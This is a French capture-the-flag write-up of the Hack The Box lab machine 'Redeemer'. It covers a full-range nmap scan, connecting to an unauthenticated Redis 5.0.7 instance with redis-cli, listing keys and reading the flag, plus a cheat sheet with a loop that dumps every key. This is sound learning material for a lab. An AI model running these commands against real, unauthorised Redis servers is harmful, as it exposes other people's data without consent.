# Redeemer — HTB Starting Point (Tier 0)

| | |
|---|---|
| **Section** | Starting Point — Tier 0 |
| **Machine** | `Redeemer` |
| **OS** | Linux |
| **IP cible** | `10.129.155.5` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-01 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque

```
nmap défaut  →  "All 1000 ports closed"  (piège : Redis hors top-1000)
nmap -p-     →  6379/tcp : Redis 5.0.7
             →  redis-cli -h $IP  (aucune authentification)
             →  info keyspace -> db0 a 4 clés  →  keys *  →  get flag
```

---

## 1. Reconnaissance

```bash
box redeemer <IP>
nmap -sV -sC -oN nmap/initial $IP
```

→ **Piège** : le scan par défaut renvoie

```
All 1000 scanned ports on 10.129.155.5 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
```

La box répond au ping (host up), donc elle est bien là : le service tourne juste sur un port **hors des 1000 par défaut**. On scanne tous les ports :

```bash
nmap -p- --min-rate 1000 -oN nmap/allports $IP   # trouve les ports (rapide)
nmap -sV -sC -p 6379 -oN nmap/redis $IP           # version sur le port trouvé
```

| Port | Service | Version |
|---|---|---|
| 6379/tcp | redis | Redis key-value store 5.0.7 |

> Le `-p- -sV -sC` direct fonctionne mais est lent (~27 s) : il tente la détection de version sur 65535 ports. Mieux vaut découvrir les ports avec `--min-rate`, puis cibler.

---

## 2. Accès → flag

**Le concept :** Redis est une base de données clé/valeur en mémoire. Par défaut, **aucune authentification** : quiconque joint le port 6379 lit toutes les données.

```bash
redis-cli -h $IP          # -h OBLIGATOIRE, sinon il vise 127.0.0.1 (ton conteneur) -> Connection refused
```

Dans le prompt Redis :

```
> info keyspace           # quelles bases ont des clés
  db0:keys=4,expires=0,avg_ttl=0
> select 0                # db0 = base par défaut
> keys *                  # 1) "stor" 2) "numb" 3) "temp" 4) "flag"
> get flag                # -> le flag
```

> ⚠️ Piège rencontré : après `select 1`/`select 4` (bases **vides**), `get flag` renvoyait `(nil)`. La clé `flag` est dans **db0**. Toujours vérifier `info keyspace` pour savoir où sont les données.

---

## 3. Mémo Redis

| Besoin | Commande |
|---|---|
| Se connecter à la cible | `redis-cli -h $IP` |
| Quelles bases ont des clés | `info keyspace` |
| Changer de base | `select <n>` |
| Lister les clés (base courante) | `keys *` ou `--scan` |
| Lire une valeur | `get <clé>` |
| Depuis le shell, base n | `redis-cli -h $IP -n <n> keys '*'` |
| Tout dumper (db0) | `for k in $(redis-cli -h $IP -n 0 --scan); do echo "$k = $(redis-cli -h $IP -n 0 get $k)"; done` |

`--scan` > `keys *` en production (ne bloque pas le serveur).

---

## 4. Leçons à retenir

- **« Aucun port » ≠ « rien à attaquer »** : le scan par défaut ne couvre que le top-1000. Lancer un **full scan `-p-`** dès qu'un résultat est vide ou maigre. Redis (6379) n'est pas dans le top-1000.
- **Redis sans auth** : accès total aux données sans mot de passe. Toujours tester `redis-cli -h $IP` sur un 6379 ouvert.
- **Bases multiples** : `info keyspace` localise les données avant de chercher à l'aveugle.
- **`-h` obligatoire** : `redis-cli` seul se connecte en local (127.0.0.1), pas à la cible.

---

## Commandes — récap express

```bash
box redeemer <IP>
nmap -p- --min-rate 1000 -oN nmap/allports $IP    # -> 6379
nmap -sV -sC -p 6379 -oN nmap/redis $IP           # -> Redis 5.0.7
redis-cli -h $IP
# > info keyspace ; select 0 ; keys * ; get flag
```
